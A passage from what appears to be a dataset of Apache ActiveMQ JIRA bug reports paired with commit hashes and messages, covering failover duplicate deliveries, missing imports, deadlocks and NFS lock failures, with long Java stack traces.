        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:667)
        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:348)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
        at java.lang.Thread.run(Thread.java:745)
{noformat}",dc68ad89678eba9d18184f1a5342eb7ecf774596,[AMQ-5875] add queue test variant to validate shared mkahaDb remains when one dest is deleted
12839853,AMQ-5858,"Install webconsole feature in karaf and send a message using the webconsole with default values. You will see the exception below.

The reason is a missing import package for javax.xml.bind.

-----

org.springframework.web.util.NestedServletException: Handler processing failed; nested exception is java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter
	at org.springframework.web.servlet.DispatcherServlet.triggerAfterCompletionWithError(DispatcherServlet.java:1260)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:939)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:851)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:953)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:855)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:829)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)
	at org.apache.activemq.web.AuditFilter.doFilter(AuditFilter.java:59)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:106)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:267)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
	at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:80)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:497)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter
	at org.apache.activemq.web.WebClient.createWebClient(WebClient.java:375)
	at org.apache.activemq.web.WebClient.getWebClient(WebClient.java:105)
	at org.apache.activemq.web.controller.SendMessage.handleRequest(SendMessage.java:53)
	at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:919)
	... 35 more
Caused by: java.lang.ClassNotFoundException: javax.xml.bind.DatatypeConverter not found by org.apache.activemq.activemq-web-console [62]
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1558)
	at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1998)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:358)
	... 40 more
",97b0619b26947c9170230e6969df13116f4a2463,[AMQ-5858] add import package
12839158,AMQ-5854,"Use case :
                With Spring DMLC, Read a jms message in a queue, produce a jms message in an output queue and write data in database.

Problem description :

                Due to hight CPU usage, the inactity monitor closes connections between clients and broker while 16 messages were processed.

{noformat}
2015-06-01 04:39:01,130 | WARN  | Transport Connection to: tcp://*** failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>30000) long: tcp://*** | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ InactivityMonitor Worker
{noformat}
                15 messages are rolled back and redilevered to another consummer.

                In the log we got 15 warnings :
{noformat}
ActiveMQMessageConsumer   |WARN |jmsContainer-173|rolling back transaction (XID:***) post failover recovery. 1 previously delivered message(s) not replayed to consumer: ***
{noformat}
                But one message is not rolled back (the transaction commit) and is also redileverd to another consummer. So it's processed twice by two different consummers (two inserts in database and two output JMS messages generated) and is not deduplicated.

                In the activeMq log we got the message :

{noformat}
WARN  | Async error occurred:  | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///***
                       javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 6665, responseRequired = false, ackType = 2, consumerId = ID:***, firstMessageId = ID:***-50800-1433109620591-1:2:31356:1:1, lastMessageId = ID:***-50800-1433109620591-1:2:31356:1:1, destination = queue://***, transactionId = XID:[1096044365,globalId=47524f55505f3030303038736572766963657472616974656d656e7431363536373030343133,branchId=47524f55505f3030303038736572766963657472616974656d656e743137343737], messageCount = 1, poisonCause = null}; Could not find Message-ID ID:***-50800-1433109620591-1:2:31356:1:1 in dispatched-list (start of ack)
{noformat}

                For this duplicated message, the failover occur during prepare phase of commit :

{noformat}
[{2015/06/01 04:39:50,322 |FailoverTransport         |WARN |jmsContainer-152|Transport (tcp://***) failed, reason:  , attempting to automatically reconnect}]
org.apache.activemq.transport.InactivityIOException: Cannot send, channel has already failed: ***
                at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:297)
                at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:286)
                at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
                at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
                at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:658)
                at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
                at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
                at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1321)
                at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1315)
                at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1933)
                at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2099)
                at org.apache.activemq.ActiveMQSession.sendAck(ActiveMQSession.java:2094)
                at org.apache.activemq.ActiveMQMessageConsumer.acknowledge(ActiveMQMessageConsumer.java:1083)
                at org.apache.activemq.ActiveMQMessageConsumer$5.beforeEnd(ActiveMQMessageConsumer.java:1041)
                at org.apache.activemq.TransactionContext.beforeEnd(TransactionContext.java:202)
                at org.apache.activemq.TransactionContext.end(TransactionContext.java:409)
                at com.atomikos.datasource.xa.XAResourceTransaction.suspend(XAResourceTransaction.java:457)
                at com.atomikos.datasource.xa.XAResourceTransaction.prepare(XAResourceTransaction.java:608)
                at com.atomikos.icatch.imp.PrepareMessage.send(PrepareMessage.java:61)
                at com.atomikos.icatch.imp.PropagationMessage.submit(PropagationMessage.java:111)
                at com.atomikos.icatch.imp.Propagator$PropagatorThread.run(Propagator.java:87)
                at com.atomikos.icatch.imp.Propagator.submitPropagationMessage(Propagator.java:66)
                at com.atomikos.icatch.imp.ActiveStateHandler.prepare(ActiveStateHandler.java:173)
                at com.atomikos.icatch.imp.CoordinatorImp.prepare(CoordinatorImp.java:832)
                at com.atomikos.icatch.imp.CoordinatorImp.terminate(CoordinatorImp.java:1159)
                at com.atomikos.icatch.imp.CompositeTerminatorImp.commit(CompositeTerminatorImp.java:92)
                at com.atomikos.icatch.jta.TransactionImp.commit(TransactionImp.java:236)
                at com.atomikos.icatch.jta.TransactionManagerImp.commit(TransactionManagerImp.java:498)
                at com.atomikos.icatch.jta.UserTransactionImp.commit(UserTransactionImp.java:129)
                at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1011)
                at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:755)
                at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:724)
                at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)
                at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101)
                at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:995)
                at java.lang.Thread.run(Thread.java:761)
{noformat}

Our analysis :

                We think that the duplicate message is caused by the failover during the prepare phase of the commit so we modify the source code to reproduce the case.

                Our modifications in config to produce failovers:
                               broker : transport.useKeepAlive=false
                               client : wireFormat.maxInactivityDuration=5000


                We add Thread.sleep in the source code of org.apache.activemq.ActiveMQMessageConsumer to force failover to be done exactly where we think it causes problems :

{code:title=org.apache.activemq.ActiveMQMessageConsumer#acknowledge()|borderStyle=solid}                

                    public void acknowledge() throws JMSException {
                               clearDeliveredList();
                               waitForRedeliveries();
                               synchronized(deliveredMessages) {

                                   // BEGIN MODIFIED CODE
                                   LOG.warn(""start sleeping 20 seconds to test failover"");
                                   try{
                                       Thread.sleep(1000 * 20 );
                                   }catch (InterruptedException e){
                                       LOG.error(""Exception :"",e);
                                   }
                                   LOG.warn(""end sleeping 20 seconds to test failover"");
                                   // END MODIFIED CODE

                                   // Acknowledge all messages so far.
                                   MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                   if (ack == null)
                                       return; // no msgs

                                   if (session.getTransacted()) {
                                       rollbackOnFailedRecoveryRedelivery();
                                       session.doStartTransaction();
                                       ack.setTransactionId(session.getTransactionContext().getTransactionId());
                                   }

                                   pendingAck = null;
                                    session.sendAck(ack);

                                   // Adjust the counters
                                   deliveredCounter = Math.max(0, deliveredCounter - deliveredMessages.size());
                                   additionalWindowSize = Math.max(0, additionalWindowSize - deliveredMessages.size());

                                   if (!session.getTransacted()) {
                                       deliveredMessages.clear();
                                   }
                               }
                    }
{code}                               
                
                With these changes on the configuration and the code, the problem is easily reproduced.

                We also try with transactedIndividualAck=true, and we add a Thread.sleep in the code :

{code:title=org.apache.activemq.ActiveMQMessageConsumer#registerSync()|borderStyle=solid}                
                    private void registerSync() throws JMSException {
                               session.doStartTransaction();
                               if (!synchronizationRegistered) {
                                   synchronizationRegistered = true;
                                   session.getTransactionContext().addSynchronization(new Synchronization() {
                                       @Override
                                       public void beforeEnd() throws Exception {
                                           if (transactedIndividualAck) {
                                               clearDeliveredList();
                                               waitForRedeliveries();
                                               synchronized(deliveredMessages) {
                                                   
                                                   // BEGIN MODIFIED CODE
                                                   LOG.warn(""start sleeping 20 seconds to test failover"");
                                                   try{
                                                       Thread.sleep(1000 * 20 );
                                                   }catch (InterruptedException e){
                                                       LOG.error(""Exception :"",e);
                                                   }
                                                   LOG.warn(""end sleeping 20 seconds to test failover"");
                                                   // END MODIFIED CODE                            

                                                   rollbackOnFailedRecoveryRedelivery();
                                               }
                                           } else {
                                               acknowledge();
                                           }
                                           synchronizationRegistered = false;
                                       }

                                       @Override
                                       public void afterCommit() throws Exception {
                                           commit();
                                           synchronizationRegistered = false;
                                       }

                                       @Override
                                       public void afterRollback() throws Exception {
                                           rollback();
                                           synchronizationRegistered = false;
                                       }
                                   });
                               }
                    }
{code}                                               
                With these modifications, we still get duplicates messages.

                We think that the problem is that the statement synchronized(deliveredMessages) prevents the call of clearDeliveredList() by another ActiveMQConnection thread that clears messages in progress.
                By adding logs we observe that a thread is waiting deliveredMessages ‘s lock in clearDeliveredList() method.

                
Question :
                
                We tried fixes described in https://issues.apache.org/jira/browse/AMQ-5068 and https://issues.apache.org/jira/browse/AMQ-3519 but it doesn’t help to solve our problem.
                Is there a workaround or a config parameter that can help to prevent this problem ?
                
                We are working on our side to find a correction. An option may be to force rolling back transaction if there is a failover during the prepare phase of commit in ConnectionStateTracker.restoreTransactions().


",de5d0d9430838948196f573c5278c75fbee9f25e,"https://issues.apache.org/jira/browse/AMQ-5854

Fix intermittent test failure caused by the test reconnecting before
the failure assertion had a chance to assert the expected failure"
12837940,AMQ-5844,"AbortSlowConsumerStrategy can forcefully abort a slow consumer on the broker side if the consumer (client side) is not responding to the request to gracefully shutdown.

If the connection between broker and consumer is subsequently lost, the failover transport recreates the connection and transparently re-registers all consumers on the broker side including those slow consumers that were previously forcefully aborted. 

It would be good to introduce some logic into the failover transport to avoid recreating slow consumers that have already been ""forcefully"" aborted on broker. ",ffef4dc5fa68cd0e02f4850582fb09db381394da,https://issues.apache.org/jira/browse/AMQ-5844 - patch and test applied with thanks to Ganesh Murthy - ganeshmurthy
12837504,AMQ-5839,The name used for the AMQP NoLocal filter value is wrong and maps to the selector string leading to incorrectly enabling noLocal for consumers that set a selector using the name in the filter described value.  ,732fd5684017cd585bfb418950a03ec9a6f44e49,"https://issues.apache.org/jira/browse/AMQ-5839

Disable failing test, broker doesn't currently recover the noLocal state
for a durable subscription."
12834223,AMQ-5816,"It is impossible to use combination of HTTP transport with LevelDB as persistent store: when trying to send a persistent message the broker throws a NullPointerException (see attachment Exception).

This happens because HTTP transport uses XStream library for deserealization, which follows Java Serialization rules. As a result, transient field [dataLocator|https://github.com/apache/activemq/blob/activemq-5.11.1/activemq-client/src/main/java/org/apache/activemq/command/MessageId.java#L37] is null after deserialization. Later, LevelDB invokes getDataLocator, and that's when NPE is thrown.

Proposed patch adds private method readResolve, which is invoked after deserialization, and which initializes dataLocator field.",df06bdabdc0e9f892449e0ef0d8783aea6047802,"https://issues.apache.org/jira/browse/AMQ-5816

Apply patch from Ievgen Tarasov that ensures that the data locator is
initialized when a MessageId is deserialized."
12833170,AMQ-5804,"After specifying connection url like:
https://address:443?proxyHost=192.168.1.1&proxyPort=80
I got exception Scheme 'http' not registered
It happens because default schema for proxy is http,
but when we uses https address it registers only https schema in HttpsClientTransport

",d919db5e3d8f453c173f6ed82b1e0bce3b3df5fb,"https://issues.apache.org/jira/browse/AMQ-5804

Apply patch from Pavlo Vasylchenko"
12827194,AMQ-5763,"I try to consume messages via AMQP in transactions (1 message per transaction),  The consumption is stopped exactly after 500 messages. I am using qpid-jms AMQP client, but i have also reproduced this issue using SwiftMQ AMQP client. This issue happen only with ActiveMQ (my version is 5.11.1). For example on Qpid Java Broker(version 0.32) it is working correctly.

I have created sample test which may be used for issue reproduction. For reproduction please use following instructions: 
# Download amqptxerror.zip
# Unzip.
# Import pom.xml to your favorite IDE.
# Start your ActiveMQ broker or run maven with ""-p broker"".
# Run src/test/java/AMQPTxTest.java.

",32f21ff1a9f693e9f88aef71eb5b1557410b3547,"https://issues.apache.org/jira/browse/AMQ-5763

Capture the reported issue in a test case to track the fix."
12772996,AMQ-5568,"This problem may only occur on a shared file system master/slave setup. 
I can reproduce reliably on a NFSv4 mount using a persistence adapter configuration like 

{code}
<levelDB directory=""/nfs/activemq/data/leveldb"" lockKeepAlivePeriod=""5000"">
  <locker>
    <shared-file-locker lockAcquireSleepInterval=""10000""/>
  </locker>
</levelDB>
{code}

However the problem is also reproducible using kahaDB.
Two broker instances competing for the lock on the shared storage (e.g. leveldb or kahadb). Lets say brokerA becomes master, broker B slave.

If brokerA looses access to the NFS share, it will shut down. As part of shutting down, it tries delete the lock file of the persistence adapter. Now since the NFS share is gone, all file i/o calls hang for a good while before returning errors. As such the broker shut down gets delayed.

In the meantime the slave broker B (not affected by the NFS problem) grabs the lock and becomes master.

If the NFS mount is restored while broker A (the previous master) still hangs on the file i/o operations (as part of its shutdown routine), the attempt to delete the persistence adapter lock file will finally succeed and broker A shuts down. 

Deleting the lock file however also affects the new master broker B who periodically runs a keepAlive() check on the lock. That check verifies the file still exists and the FileLock is still valid. As the lock file got deleted, keepAlive() fails on broker B and that broker shuts down as well. 
The overall result is that both broker instances have shut down despite an initially successful failover.

Using restartAllowed=true is not an option either as this can cause other problems in an NFS based master/slave setup.
",55f040e616899262d19c2bd1178826a65359516c,https://issues.apache.org/jira/browse/AMQ-5568  - ensure directory exists - fix ci
12769626,AMQ-5535,"Hung test - org.apache.activemq.transport.failover.FailoverUpdateURIsTest

deadlock:
{code}Name: ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51978
State: BLOCKED on org.apache.activemq.ActiveMQConnection@2ccf4c0e owned by: main
Total blocked: 3  Total waited: 1

Stack trace: 
org.apache.activemq.ActiveMQConnection.getScheduler(ActiveMQConnection.java:2554)
org.apache.activemq.ActiveMQSession.clearMessagesInProgress(ActiveMQSession.java:687)
org.apache.activemq.ActiveMQConnection.transportInterupted(ActiveMQConnection.java:2043)
org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:105)
org.apache.activemq.transport.TransportFilter.transportInterupted(TransportFilter.java:105)
org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:279)
   - locked java.lang.Object@6242de17
org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:216)
org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101)
org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160)
org.apache.activemq.transport.AbstractInactivityMonitor.onException(AbstractInactivityMonitor.java:314)
org.apache.activemq.transport.TransportSupport.onException(TransportSupport.java:96)
org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:200)
java.lang.Thread.run(Thread.java:745)
{code}
--
{code}Name: main
State: BLOCKED on java.lang.Object@6242de17 owned by: ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@51978
Total blocked: 18  Total waited: 1,043

Stack trace: 
org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:572)
org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1331)
org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1325)
org.apache.activemq.AdvisoryConsumer.dispose(AdvisoryConsumer.java:57)
   - locked org.apache.activemq.AdvisoryConsumer@3a6d125b
org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:660)
   - locked org.apache.activemq.ActiveMQConnection@2ccf4c0e
org.apache.activemq.transport.failover.FailoverUpdateURIsTest.tearDown(FailoverUpdateURIsTest.java:52)
junit.framework.TestCase.runBare(TestCase.java:146)
junit.framework.TestResult$1.protect(TestResult.java:122)
junit.framework.TestResult.runProtected(TestResult.java:142)
junit.framework.TestResult.run(TestResult.java:125)
junit.framework.TestCase.run(TestCase.java:129)
junit.framework.TestSuite.runTest(TestSuite.java:255)
junit.framework.TestSuite.run(TestSuite.java:250)
org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264)
org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153)
org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124)
org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200)
org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153)
org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)
{code}

",de549f8926988ab436084225cdcd6595f1657262,https://issues.apache.org/jira/browse/AMQ-5535 - allow close state reporting w/o contention
12768439,AMQ-5525,"failures:
{code}  ActiveMQAMQPBrokerFeatureTest>ActiveMQBrokerFeatureTest.test:70->AbstractFeatureTest.withinReason:259 expected:<[JMS_BODY_FIELD:JMSText = 1421674632296]> but was:<[]>
  ActiveMQBrokerFeatureTest.test:70->AbstractFeatureTest.withinReason:259 expected:<[JMS_BODY_FIELD:JMSText = 1421674680492]> but was:<[]>{code} root cause - somewhere in blueprint converter. 
{code}java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342)
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54)
	at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119)
	at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source)
	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAs(Subject.java:356)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340)
	... 30 more
2015-01-19 13:38:05,367 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:
activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492
java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342)
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54)
	at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119)
	at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source)
	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAs(Subject.java:356)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340)
	... 30 more
2015-01-19 13:38:06,379 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:
activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492
java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342)
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54)
	at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119)
	at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source)
